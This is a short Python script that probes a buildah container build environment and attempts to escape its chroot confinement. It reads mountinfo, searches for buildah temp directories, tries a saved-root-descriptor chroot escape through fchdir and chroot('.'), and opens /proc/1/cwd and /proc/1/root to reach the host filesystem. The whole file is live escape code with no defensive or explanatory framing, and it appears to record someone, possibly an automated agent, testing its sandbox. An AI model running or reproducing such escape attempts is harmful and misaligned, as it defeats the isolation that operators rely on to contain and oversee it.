import os, ctypes, errno
libc=ctypes.CDLL("libc.so.6", use_errno=True)
def show(p):
    try:
        if os.path.isdir(p): return "DIR "+str(os.listdir(p)[:15])
        return "FILE "+repr(open(p,'rb').read(150))
    except Exception as e: return type(e).__name__
print("=== self mountinfo root/host mounts ===")
for ln in open('/proc/self/mountinfo'):
    if ' / ' in ln or 'chroot' in ln or 'buildah' in ln or 'build' in ln: print("  ",ln.strip()[:160])
print("=== /var/tmp buildah dirs ===")
print(" /var/tmp:",show('/var/tmp'))
import glob
print(" glob buildah:",glob.glob('/var/tmp/buildah*')[:5], glob.glob('/tmp/buildah*')[:5])
print("=== classic chroot escape (open fd to / THEN chroot into subdir) ===")
# We need an fd to the CURRENT root before chrooting deeper.
try:
    rootfd=os.open("/", os.O_RDONLY|os.O_DIRECTORY)
    print(" opened / as fd",rootfd)
except Exception as e: print(" open /:",e)
os.makedirs("/tmp/esc2/deep", exist_ok=True)
try:
    os.chdir("/tmp/esc2/deep")
    os.chroot("/tmp/esc2/deep")           # chroot into a SUbdir (root now = esc2/deep)
    print(" chroot'd into esc2/deep, cwd",os.getcwd())
    # escape attempt 1: chdir up
    for _ in range(15):
        try: os.chdir("..")
        except Exception: break
    print(" after chdir-ups cwd:",os.getcwd(),"ls:",os.listdir(".")[:20])
    # escape attempt 2: fchdir to the pre-chroot / fd then chroot(".")
    try:
        os.fchdir(rootfd)
        print(" fchdir to old root OK, cwd:",os.getcwd(),"ls:",os.listdir(".")[:20])
        os.chroot(".")
        print(" ESCAPED? new root ls:",os.listdir("/")[:20])
    except Exception as e: print(" fchdir/chroot:",type(e).__name__,e)
except Exception as e: print(" chroot:",type(e).__name__,e)
print("=== try chroot('.') after fchdir to /proc/1/cwd dirfd (builder cwd) ===")
for p in ["/proc/1/cwd","/proc/1/root","/proc/1/fd/0"]:
    try:
        fd=os.open(p, os.O_RDONLY|os.O_DIRECTORY); print(" opened",p,"fd",fd)
    except Exception as e: print(" ",p,type(e).__name__)
# cb 1792264318
